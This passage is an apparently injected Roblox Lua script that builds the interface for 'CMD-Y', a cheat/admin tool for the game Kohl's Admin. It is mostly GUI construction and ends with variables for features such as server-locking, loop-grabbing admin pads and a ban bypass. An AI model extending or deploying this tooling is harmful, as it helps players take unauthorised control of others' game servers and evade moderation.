	CMDY.GoTo.Font = Enum.Font.SourceSans
	CMDY.GoTo.Text = "GoTo"
	CMDY.GoTo.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.GoTo.TextSize = 23.000

	CMDY.UICorner_25.Parent = CMDY.GoTo

	CMDY.close.Name = "close"
	CMDY.close.Parent = CMDY.PlayerMenu
	CMDY.close.BackgroundColor3 = Color3.fromRGB(255, 96, 64)
	CMDY.close.Position = UDim2.new(0.90989697, 0, 0.0264454335, 0)
	CMDY.close.Size = UDim2.new(0, 16, 0, 16)
	CMDY.close.Font = Enum.Font.SourceSans
	CMDY.close.Text = ""
	CMDY.close.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.close.TextSize = 14.000

	CMDY.UICorner_26.CornerRadius = UDim.new(0, 20)
	CMDY.UICorner_26.Parent = CMDY.close

	CMDY.ThemeColorPickerMenu.Name = "ThemeColorPickerMenu"
	CMDY.ThemeColorPickerMenu.Parent = CMDY.Drop
	CMDY.ThemeColorPickerMenu.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
	CMDY.ThemeColorPickerMenu.Position = UDim2.new(0.23856926, 0, 0.0630843714, 0)
	CMDY.ThemeColorPickerMenu.Size = UDim2.new(0, 266, 0, 266)
	CMDY.ThemeColorPickerMenu.Visible = false

	CMDY.UICorner_27.Parent = CMDY.ThemeColorPickerMenu

	CMDY.Preview.Name = "Preview"
	CMDY.Preview.Parent = CMDY.ThemeColorPickerMenu
	CMDY.Preview.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Preview.Position = UDim2.new(0.312030077, 0, 0.0864661634, 0)
	CMDY.Preview.Size = UDim2.new(0, 100, 0, 100)

	CMDY.Gradient.Name = "Gradient"
	CMDY.Gradient.Parent = CMDY.ThemeColorPickerMenu
	CMDY.Gradient.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Gradient.Position = UDim2.new(0.0751879662, 0, 0.624060154, 0)
	CMDY.Gradient.Size = UDim2.new(0, 232, 0, 36)
	CMDY.Gradient.Font = Enum.Font.SourceSans
	CMDY.Gradient.Text = ""
	CMDY.Gradient.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Gradient.TextSize = 14.000

	CMDY.Slider.Name = "Slider"
	CMDY.Slider.Parent = CMDY.Gradient
	CMDY.Slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Slider.Position = UDim2.new(0.0517241396, 0, 0, 0)
	CMDY.Slider.Size = UDim2.new(0, 5, 0, 36)
	CMDY.Slider.Font = Enum.Font.SourceSans
	CMDY.Slider.Text = ""
	CMDY.Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Slider.TextSize = 14.000

	CMDY.UICorner_28.Parent = CMDY.Slider

	CMDY.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.22, Color3.fromRGB(255, 128, 0)), ColorSequenceKeypoint.new(0.41, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.56, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.70, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.87, Color3.fromRGB(96, 34, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(234, 0, 255))}
	CMDY.UIGradient.Parent = CMDY.Gradient

	CMDY.close_2.Name = "close"
	CMDY.close_2.Parent = CMDY.ThemeColorPickerMenu
	CMDY.close_2.BackgroundColor3 = Color3.fromRGB(255, 96, 64)
	CMDY.close_2.Position = UDim2.new(0.90989697, 0, 0.0264454335, 0)
	CMDY.close_2.Size = UDim2.new(0, 16, 0, 16)
	CMDY.close_2.Font = Enum.Font.SourceSans
	CMDY.close_2.Text = ""
	CMDY.close_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.close_2.TextSize = 14.000

	CMDY.UICorner_29.CornerRadius = UDim.new(0, 20)
	CMDY.UICorner_29.Parent = CMDY.close_2

	CMDY.AddCommandMenu.Name = "AddCommandMenu"
	CMDY.AddCommandMenu.Parent = CMDY.Drop
	CMDY.AddCommandMenu.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
	CMDY.AddCommandMenu.Position = UDim2.new(0.23856926, 0, 0.0630843714, 0)
	CMDY.AddCommandMenu.Size = UDim2.new(0, 266, 0, 266)
	CMDY.AddCommandMenu.Visible = false

	CMDY._46j5k456j45i.Name = "46j5k456j45i"
	CMDY._46j5k456j45i.Parent = CMDY.AddCommandMenu

	CMDY.closebbb.Name = "closebbb"
	CMDY.closebbb.Parent = CMDY.AddCommandMenu
	CMDY.closebbb.BackgroundColor3 = Color3.fromRGB(255, 96, 64)
	CMDY.closebbb.Position = UDim2.new(0.90989697, 0, 0.0264454335, 0)
	CMDY.closebbb.Size = UDim2.new(0, 16, 0, 16)
	CMDY.closebbb.Font = Enum.Font.SourceSans
	CMDY.closebbb.Text = ""
	CMDY.closebbb.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.closebbb.TextSize = 14.000

	CMDY._23g2gg.CornerRadius = UDim.new(0, 20)
	CMDY._23g2gg.Name = "23g2gg"
	CMDY._23g2gg.Parent = CMDY.closebbb

	CMDY.CMDBOX.Name = "CMDBOX"
	CMDY.CMDBOX.MultiLine = true
	CMDY.CMDBOX.TextWrapped = true
	CMDY.CMDBOX.ClearTextOnFocus = false
	CMDY.CMDBOX.Parent = CMDY.AddCommandMenu
	CMDY.CMDBOX.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
	CMDY.CMDBOX.Position = UDim2.new(0.10150376, 0, 0.131464913, 0)
	CMDY.CMDBOX.Size = UDim2.new(0, 215, 0, 187)
	CMDY.CMDBOX.Font = Enum.Font.SourceSans
	CMDY.CMDBOX.PlaceholderText = "--Code here"
	CMDY.CMDBOX.TextXAlignment = Enum.TextXAlignment.Left
	CMDY.CMDBOX.TextYAlignment = Enum.TextYAlignment.Top
	CMDY.CMDBOX.Text = "--put your script here. _G.Chat('msg') to chat/use commands."
	CMDY.CMDBOX.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CMDBOX.TextSize = 14.000

	CMDY.CUSTOMLAB.Name = "CUSTOMLAB"
	CMDY.CUSTOMLAB.Parent = CMDY.AddCommandMenu
	CMDY.CUSTOMLAB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CUSTOMLAB.BackgroundTransparency = 1.000
	CMDY.CUSTOMLAB.Position = UDim2.new(0.312030077, 0, 0.0299611539, 0)
	CMDY.CUSTOMLAB.Size = UDim2.new(0, 103, 0, 16)
	CMDY.CUSTOMLAB.Font = Enum.Font.Roboto
	CMDY.CUSTOMLAB.Text = "Custom Command"
	CMDY.CUSTOMLAB.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CUSTOMLAB.TextSize = 23.000

	CMDY.Add.Name = "Add"
	CMDY.Add.Parent = CMDY.AddCommandMenu
	CMDY.Add.BackgroundColor3 = Color3.fromRGB(83, 83, 83)
	CMDY.Add.Position = UDim2.new(0.676691711, 0, 0.860788345, 0)
	CMDY.Add.Size = UDim2.new(0, 36, 0, 28)
	CMDY.Add.Font = Enum.Font.Highway
	CMDY.Add.Text = "ADD"
	CMDY.Add.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Add.TextScaled = true
	CMDY.Add.TextSize = 14.000
	CMDY.Add.TextWrapped = true

	CMDY._2y2tyui.Name = "2y2tyui"
	CMDY._2y2tyui.Parent = CMDY.Add

	CMDY.NAMELAB.Name = "NAMELAB"
	CMDY.NAMELAB.Parent = CMDY.AddCommandMenu
	CMDY.NAMELAB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.NAMELAB.BackgroundTransparency = 1.000
	CMDY.NAMELAB.Position = UDim2.new(0.101503752, 0, 0.88334465, 0)
	CMDY.NAMELAB.Size = UDim2.new(0, 103, 0, 16)
	CMDY.NAMELAB.Font = Enum.Font.Roboto
	CMDY.NAMELAB.Text = "Name:"
	CMDY.NAMELAB.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.NAMELAB.TextSize = 23.000

	CMDY.NameToDo.Name = "NameToDo"
	CMDY.NameToDo.Parent = CMDY.AddCommandMenu
	CMDY.NameToDo.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
	CMDY.NameToDo.Position = UDim2.new(0.430169821, 0, 0.860788286, 0)
	CMDY.NameToDo.Size = UDim2.new(0, 58, 0, 29)
	CMDY.NameToDo.Font = Enum.Font.SourceSans
	CMDY.NameToDo.Text = ""
	CMDY.NameToDo.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.NameToDo.TextSize = 14.000

	CMDY.sdfsdfsdf3423.CornerRadius = UDim.new(20, 20)
	CMDY.sdfsdfsdf3423.Name = "sdfsdfsdf3423"
	CMDY.sdfsdfsdf3423.Parent = CMDY.NameToDo

	CMDY.EditCommand.Name = "EditCommand"
	CMDY.EditCommand.Parent = CMDY.Drop
	CMDY.EditCommand.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
	CMDY.EditCommand.Position = UDim2.new(0.23856926, 0, 0.0630843714, 0)
	CMDY.EditCommand.Size = UDim2.new(0, 266, 0, 266)
	CMDY.EditCommand.Visible = false

	CMDY._46j5k456j45i77.Name = "46j5k456j45i77"
	CMDY._46j5k456j45i77.Parent = CMDY.EditCommand

	CMDY.closebbb2.Name = "closebbb2"
	CMDY.closebbb2.Parent = CMDY.EditCommand
	CMDY.closebbb2.BackgroundColor3 = Color3.fromRGB(255, 96, 64)
	CMDY.closebbb2.Position = UDim2.new(0.90989697, 0, 0.0264454335, 0)
	CMDY.closebbb2.Size = UDim2.new(0, 16, 0, 16)
	CMDY.closebbb2.Font = Enum.Font.SourceSans
	CMDY.closebbb2.Text = ""
	CMDY.closebbb2.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.closebbb2.TextSize = 14.000

	CMDY._23g2ggu.CornerRadius = UDim.new(0, 20)
	CMDY._23g2ggu.Name = "23g2ggu"
	CMDY._23g2ggu.Parent = CMDY.closebbb2

	CMDY.EditBox.Name = "EditBox"
	CMDY.EditBox.TextWrapped = true
	CMDY.EditBox.ClearTextOnFocus = false
	CMDY.EditBox.Parent = CMDY.EditCommand
	CMDY.EditBox.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
	CMDY.EditBox.Position = UDim2.new(0.10150376, 0, 0.131464913, 0)
	CMDY.EditBox.Size = UDim2.new(0, 215, 0, 187)
	CMDY.EditBox.Font = Enum.Font.SourceSans
	CMDY.EditBox.MultiLine = true
	CMDY.EditBox.PlaceholderText = "--Code here"
	CMDY.EditBox.Text = ""
	CMDY.EditBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.EditBox.TextSize = 14.000

	CMDY.CUSTOMEdit.Name = "CUSTOMEdit"
	CMDY.CUSTOMEdit.Parent = CMDY.EditCommand
	CMDY.CUSTOMEdit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CUSTOMEdit.BackgroundTransparency = 1.000
	CMDY.CUSTOMEdit.Position = UDim2.new(0.312030077, 0, 0.0299611539, 0)
	CMDY.CUSTOMEdit.Size = UDim2.new(0, 103, 0, 16)
	CMDY.CUSTOMEdit.Font = Enum.Font.Roboto
	CMDY.CUSTOMEdit.Text = "Edit Command"
	CMDY.CUSTOMEdit.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CUSTOMEdit.TextSize = 23.000

	CMDY.Update.Name = "Update"
	CMDY.Update.Parent = CMDY.EditCommand
	CMDY.Update.BackgroundColor3 = Color3.fromRGB(83, 83, 83)
	CMDY.Update.Position = UDim2.new(0.368421048, 0, 0.857028902, 0)
	CMDY.Update.Size = UDim2.new(0, 72, 0, 29)
	CMDY.Update.Font = Enum.Font.Highway
	CMDY.Update.Text = "UPDATE"
	CMDY.Update.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Update.TextScaled = true
	CMDY.Update.TextSize = 14.000
	CMDY.Update.TextWrapped = true

	CMDY._2y2tyuis.Name = "2y2tyuis"
	CMDY._2y2tyuis.Parent = CMDY.Update

	CMDY.MapColorPicker.Name = "MapColorPicker"
	CMDY.MapColorPicker.Parent = CMDY.Drop
	CMDY.MapColorPicker.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
	CMDY.MapColorPicker.Position = UDim2.new(0.23856926, 0, 0.0630843714, 0)
	CMDY.MapColorPicker.Size = UDim2.new(0, 266, 0, 266)
	CMDY.MapColorPicker.Visible = false

	CMDY.UICorner_30.Parent = CMDY.MapColorPicker

	CMDY.Preview_2.Name = "Preview"
	CMDY.Preview_2.Parent = CMDY.MapColorPicker
	CMDY.Preview_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Preview_2.Position = UDim2.new(0.312030077, 0, 0.0864661634, 0)
	CMDY.Preview_2.Size = UDim2.new(0, 100, 0, 100)

	CMDY.Gradient_2.Name = "Gradient"
	CMDY.Gradient_2.Parent = CMDY.MapColorPicker
	CMDY.Gradient_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Gradient_2.Position = UDim2.new(0.0751879662, 0, 0.624060154, 0)
	CMDY.Gradient_2.Size = UDim2.new(0, 232, 0, 36)
	CMDY.Gradient_2.Font = Enum.Font.SourceSans
	CMDY.Gradient_2.Text = ""
	CMDY.Gradient_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Gradient_2.TextSize = 14.000

	CMDY.Slider_2.Name = "Slider"
	CMDY.Slider_2.Parent = CMDY.Gradient_2
	CMDY.Slider_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Slider_2.Position = UDim2.new(0.0517241396, 0, 0, 0)
	CMDY.Slider_2.Size = UDim2.new(0, 5, 0, 36)
	CMDY.Slider_2.Font = Enum.Font.SourceSans
	CMDY.Slider_2.Text = ""
	CMDY.Slider_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Slider_2.TextSize = 14.000

	CMDY.UICorner_31.Parent = CMDY.Slider_2

	CMDY.UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.22, Color3.fromRGB(255, 128, 0)), ColorSequenceKeypoint.new(0.41, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.56, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.70, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.87, Color3.fromRGB(96, 34, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(234, 0, 255))}
	CMDY.UIGradient_2.Parent = CMDY.Gradient_2

	CMDY.close_3.Name = "close"
	CMDY.close_3.Parent = CMDY.MapColorPicker
	CMDY.close_3.BackgroundColor3 = Color3.fromRGB(255, 96, 64)
	CMDY.close_3.Position = UDim2.new(0.90989697, 0, 0.0264454335, 0)
	CMDY.close_3.Size = UDim2.new(0, 16, 0, 16)
	CMDY.close_3.Font = Enum.Font.SourceSans
	CMDY.close_3.Text = ""
	CMDY.close_3.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.close_3.TextSize = 14.000

	CMDY.UICorner_32.CornerRadius = UDim.new(0, 20)
	CMDY.UICorner_32.Parent = CMDY.close_3

	CMDY.UICorner_33.Parent = CMDY.Container

	CMDY.Player_2.Name = "Player"
	CMDY.Player_2.Parent = CMDY.Container
	CMDY.Player_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Player_2.BackgroundTransparency = 1.000
	CMDY.Player_2.Position = UDim2.new(1.34426224, 0, 0.247466505, 0)
	CMDY.Player_2.Size = UDim2.new(0, 75, 0, 72)
	CMDY.Player_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

	CMDY.UICorner_34.CornerRadius = UDim.new(0, 100)
	CMDY.UICorner_34.Parent = CMDY.Player_2

	CMDY.Dropdown.Name = "Dropdown"
	CMDY.Dropdown.Parent = CMDY.Player_2
	CMDY.Dropdown.BackgroundColor3 = Color3.fromRGB(88, 88, 88)
	CMDY.Dropdown.Position = UDim2.new(0.104999997, 0, 1.09583342, 0)
	CMDY.Dropdown.Size = UDim2.new(0, 63, 0, 22)
	CMDY.Dropdown.Font = Enum.Font.JosefinSans
	CMDY.Dropdown.Text = " Action.."
	CMDY.Dropdown.TextColor3 = Color3.fromRGB(152, 152, 152)
	CMDY.Dropdown.TextSize = 15.000
	CMDY.Dropdown.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.UICorner_35.Parent = CMDY.Dropdown

	CMDY.Label.Name = "Label"
	CMDY.Label.Parent = CMDY.Player_2
	CMDY.Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Label.BackgroundTransparency = 1.000
	CMDY.Label.Position = UDim2.new(-0.0375000015, 0, -0.333651721, 0)
	CMDY.Label.Size = UDim2.new(0, 86, 0, 23)
	CMDY.Label.Font = Enum.Font.SourceSans
	CMDY.Label.Text = "Player"
	CMDY.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Label.TextSize = 23.000
	CMDY.Label.TextWrapped = true

	CMDY.TopBar.Name = "TopBar"
	CMDY.TopBar.Parent = CMDY.Container
	CMDY.TopBar.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
	CMDY.TopBar.BackgroundTransparency = 1.000
	CMDY.TopBar.ClipsDescendants = true
	CMDY.TopBar.Size = UDim2.new(0, 409, 0, 29)
	CMDY.TopBar.Visible = true

	CMDY.UICorner_36.Parent = CMDY.TopBar

	CMDY.CloseOpen.Name = "Close/Open"
	CMDY.CloseOpen.Parent = CMDY.TopBar
	CMDY.CloseOpen.BackgroundColor3 = Color3.fromRGB(255, 77, 46)
	CMDY.CloseOpen.BackgroundTransparency = 1.000
	CMDY.CloseOpen.Position = UDim2.new(0.936212778, 0, 0.206896558, 0)
	CMDY.CloseOpen.Size = UDim2.new(0, 16, 0, 16)
	CMDY.CloseOpen.Font = Enum.Font.SourceSans
	CMDY.CloseOpen.Text = ""
	CMDY.CloseOpen.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.CloseOpen.TextSize = 14.000

	CMDY.UICorner_37.CornerRadius = UDim.new(0, 20)
	CMDY.UICorner_37.Parent = CMDY.CloseOpen

	CMDY.Settings_2.Name = "Settings"
	CMDY.Settings_2.Parent = CMDY.TopBar
	CMDY.Settings_2.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.Settings_2.BackgroundTransparency = 1.000
	CMDY.Settings_2.Position = UDim2.new(0, 0, 0.0344827548, 0)
	CMDY.Settings_2.Size = UDim2.new(0, 26, 0, 25)
	CMDY.Settings_2.Image = "rbxassetid://9405931578"
	CMDY.Settings_2.ImageTransparency = 1.000

	CMDY.Rejoin.Name = "Rejoin"
	CMDY.Rejoin.Parent = CMDY.TopBar
	CMDY.Rejoin.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.Rejoin.BackgroundTransparency = 1.000
	CMDY.Rejoin.Position = UDim2.new(0.870415628, 0, 0.206896558, 0)
	CMDY.Rejoin.Size = UDim2.new(0, 18, 0, 16)
	CMDY.Rejoin.Image = "rbxassetid://11891795883"
	CMDY.Rejoin.ImageTransparency = 1.000

	CMDY.Serverhop.Name = "Serverhop"
	CMDY.Serverhop.Parent = CMDY.TopBar
	CMDY.Serverhop.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.Serverhop.BackgroundTransparency = 1.000
	CMDY.Serverhop.Position = UDim2.new(0.792176068, 0, 0.0689655095, 0)
	CMDY.Serverhop.Size = UDim2.new(0, 26, 0, 25)
	CMDY.Serverhop.Image = "rbxassetid://11891808196"
	CMDY.Serverhop.ImageTransparency = 1.000

	CMDY.Label_2.Name = "Label"
	CMDY.Label_2.Parent = CMDY.Container
	CMDY.Label_2.AnchorPoint = Vector2.new(0.5, 0.5)
	CMDY.Label_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Label_2.BackgroundTransparency = 1.000
	CMDY.Label_2.ClipsDescendants = true
	CMDY.Label_2.Position = UDim2.new(0.499836028, 0, 0.498369753, 0)
	CMDY.Label_2.Size = UDim2.new(0, 92, 0, 25)
	CMDY.Label_2.Font = Enum.Font.JosefinSans
	CMDY.Label_2.Text = "CMD-Y"
	CMDY.Label_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Label_2.TextScaled = true
	CMDY.Label_2.TextSize = 14.000
	CMDY.Label_2.TextTransparency = 1.000
	CMDY.Label_2.TextWrapped = true

	CMDY.CMDBar.Name = "CMDBar"
	CMDY.CMDBar.Parent = CMDY.CMDY
	CMDY.CMDBar.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
	CMDY.CMDBar.BackgroundTransparency = 0.150
	CMDY.CMDBar.BorderSizePixel = 0
	CMDY.CMDBar.Position = UDim2.new(0, 0, 0, -100)
	CMDY.CMDBar.Size = UDim2.new(1, 0, 0, 28)
	CMDY.CMDBar.ClearTextOnFocus = false
	CMDY.CMDBar.Font = Enum.Font.SourceSansSemibold
	CMDY.CMDBar.Text = ""
	CMDY.CMDBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CMDBar.TextSize = 27.000
	CMDY.CMDBar.TextWrapped = true
	CMDY.CMDBar.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.Drop.Name = "Drop"
	CMDY.Drop.Parent = CMDY.TabsContainer
	CMDY.Drop.Text = ""
	CMDY.Drop.Active = false
	CMDY.Drop.AutoButtonColor = false
	CMDY.Drop.Selectable = false
	CMDY.Drop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Drop.BackgroundTransparency = 0.830
	CMDY.Drop.Position = UDim2.new(0, 0, 0.0403726697, 0)
	CMDY.Drop.Size = UDim2.new(0, 409, 0, 309)
	CMDY.Drop.Visible = false

	CMDY.SilentLogsBar.Name = "SilentLogsBar"
	CMDY.SilentLogsBar.Parent = CMDY.CMDY
	CMDY.SilentLogsBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	CMDY.SilentLogsBar.BorderColor3 = Color3.fromRGB(15, 15, 15)
	CMDY.SilentLogsBar.Position = UDim2.new(0.636704147, 0, 0.247218773, 0)
	CMDY.SilentLogsBar.Size = UDim2.new(0, 301, 0, 21)
	CMDY.SilentLogsBar.ZIndex = 6
	CMDY.SilentLogsBar.Visible = false

	CMDY.s52552252525.Name = "s52552252525"
	CMDY.s52552252525.Parent = CMDY.SilentLogsBar

	CMDY.UiCornerTghing.Name = "UiCornerTghing"
	CMDY.UiCornerTghing.Parent = CMDY.SilentLogsBar
	CMDY.UiCornerTghing.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	CMDY.UiCornerTghing.BorderColor3 = Color3.fromRGB(15, 15, 15)
	CMDY.UiCornerTghing.BorderSizePixel = 0
	CMDY.UiCornerTghing.Position = UDim2.new(0, 0, 0.347722381, 0)
	CMDY.UiCornerTghing.Size = UDim2.new(0, 301, 0, 13)
	CMDY.UiCornerTghing.ZIndex = 6

	CMDY.SilentLogsFrame.Name = "SilentLogsFrame"
	CMDY.SilentLogsFrame.Parent = CMDY.SilentLogsBar
	CMDY.SilentLogsFrame.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
	CMDY.SilentLogsFrame.BackgroundTransparency = 0.200
	CMDY.SilentLogsFrame.BorderSizePixel = 0
	CMDY.SilentLogsFrame.ClipsDescendants = true
	CMDY.SilentLogsFrame.Position = UDim2.new(0, 0, 0.896481454, 0)
	CMDY.SilentLogsFrame.Size = UDim2.new(0, 301, 0, 309)
	CMDY.SilentLogsFrame.ZIndex = 0

	CMDY.SilentLogsScrollingFrame.Name = "SilentLogsScrollingFrame"
	CMDY.SilentLogsScrollingFrame.Parent = CMDY.SilentLogsFrame
	CMDY.SilentLogsScrollingFrame.Active = true
	CMDY.SilentLogsScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.SilentLogsScrollingFrame.BackgroundTransparency = 1.000
	CMDY.SilentLogsScrollingFrame.BorderSizePixel = 0
	CMDY.SilentLogsScrollingFrame.Position = UDim2.new(0.0232558139, 0, 0, 0)
	CMDY.SilentLogsScrollingFrame.Size = UDim2.new(0, 288, 0, 309)
	CMDY.SilentLogsScrollingFrame.ScrollBarThickness = 4

	CMDY.ChatLog.Name = "ChatLog"
	CMDY.ChatLog.Parent = CMDY.CMDY
	CMDY.ChatLog.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ChatLog.BackgroundTransparency = 1.000
	CMDY.ChatLog.Size = UDim2.new(0, 286, 0, 19)
	CMDY.ChatLog.Font = Enum.Font.SourceSans
	CMDY.ChatLog.Text = ""
	CMDY.ChatLog.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ChatLog.TextSize = 20.000
	CMDY.ChatLog.TextXAlignment = Enum.TextXAlignment.Left

	CMDY.UIListLayout69.Name = "UIListLayout69"
	CMDY.UIListLayout69.Parent = CMDY.SilentLogsScrollingFrame
	CMDY.UIListLayout69.SortOrder = Enum.SortOrder.LayoutOrder

	CMDY.CloseLogs.Name = "CloseLogs"
	CMDY.CloseLogs.Parent = CMDY.SilentLogsBar
	CMDY.CloseLogs.BackgroundColor3 = Color3.fromRGB(255, 66, 66)
	CMDY.CloseLogs.Position = UDim2.new(0.944999993, 0, 0.0869999975, 0)
	CMDY.CloseLogs.Size = UDim2.new(0, 15, 0, 15)
	CMDY.CloseLogs.ZIndex = 8
	CMDY.CloseLogs.Font = Enum.Font.Roboto
	CMDY.CloseLogs.Text = "X"
	CMDY.CloseLogs.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.CloseLogs.TextSize = 14.000

	CMDY.s66226262626.CornerRadius = UDim.new(200, 0)
	CMDY.s66226262626.Name = "s66226262626"
	CMDY.s66226262626.Parent = CMDY.CloseLogs



	local function ZCFUV_fake_script() -- CMDY.CMDY.LocalScript 
		local script = Instance.new('LocalScript', CMDY.CMDY)
		local Player = game.Players.LocalPlayer
		local TS = game:GetService("TweenService")
		local UIS = game:GetService("UserInputService")
		--GUI Vars
		local Gui = script.Parent
		local Cont = Gui.Container
		local Tabs = Cont.TabsContainer
		local TopBar = Cont.TopBar
		local Menus = Tabs.Drop
		local CMDBar = Gui.CMDBar
		local PLRFrame = Cont.Player
		local CMDLabel = Cont.Label
		local LoadingText = Cont.loadingtext
		--Page Vars
		local HomeP = Tabs.HomeP
		local CommandsP = Tabs.CommandsP
		local PlayersP = Tabs.PlayersP
		local ObjectsP = Tabs.ObjectsP
		local TeleportsP = Tabs.TeleportsP
		local GearsP = Tabs.GearsP
		local MiscP = Tabs.MiscP
		local SettingsP = Tabs.SettingsP
		--HomePage Toggle Vars
		local ServerlockT = HomeP.Serverlock2
		local AntiAttachT = HomeP.AntiAttach
		local LoopgrabT = HomeP.Loopgrabi
		local PermAdminAllT = HomeP.Perm2
		local AntiDeathT = HomeP.Antikill2
		local ProtectServerT = HomeP.ProteccServer
		local AntiAbuseT = HomeP.Antiabuse1
		--Menus Vars
		local PlayerMenu = Menus.PlayerMenu
		local ThemeMenu = Menus.ThemeColorPickerMenu
		local MapThemeMenu = Menus.MapColorPicker
		--Button Vars
		local Home = Tabs.HomeB
		local Commands = Tabs.CommandsB
		local Players = Tabs.PlayersB
		local Objects = Tabs.ObjectsB
		local Teleports = Tabs.TeleportsB
		local Gears = Tabs.GearsB
		local Misc = Tabs.MiscB
		local Settings = TopBar.Settings
		local Rejoin = TopBar.Rejoin
		local ServerHop = TopBar.Serverhop
		local CO = TopBar["Close/Open"]

		--other vars
		local Kohls = workspace.Terrain:WaitForChild("_Game")
		local Map = Kohls:WaitForChild("Workspace")
		local Jails = Kohls:WaitForChild("Folder")
		local Admin = Kohls:WaitForChild("Admin")
		local Pads = Admin:WaitForChild("Pads"):GetChildren()
		local PermPad = Pads[math.random(1, #Pads)]

		local req
		local PadAmt = 0
		local lastpage
		local showsm = false
		local LoopGrab = false
		local Serverlock = false
		local PlrsAdmin = false
		local Protection = false
		local AntiDeath = false
		local AntiAbuse = false
		local GuiClosed = false
		local rainbowmap = false
		local noclip = false
		local antisit = false
		local antinoclip = false
		local antiattach = false
		local antifling = false
		local respawning = false
		local rnamel = false
		local bypassban = false
		local movestatus = false
		local spamming = false
		local pmsg = false


		local v1 = "PaintPart"
		local obbyBricks = workspace.Terrain._Game.Workspace.Obby
		local adminPads = workspace.Terrain._Game.Admin.Pads
		local house = workspace.Terrain._Game.Workspace["Basic House"]
		local adminDivs = workspace.Terrain._Game.Workspace["Admin Dividers"]
		local bricks = workspace.Terrain._Game.Workspace["Building Bricks"]
		local PlayerService = game:GetService("Players")

		local whitelist = {}
		local UntouchedPlayers = {25069105,89801517,244903894,1842223904}
		local blacklist = {}
		local padbanned = {}
		local permblacklist = {}
		local colorAPI = {}
		local cmds = {cmdnames = {}, aliases = {}, blacklisted = {"punish", "size", "freeze", "respawn", "gear"}}
		local kohlscmdslist = {cmdnames = 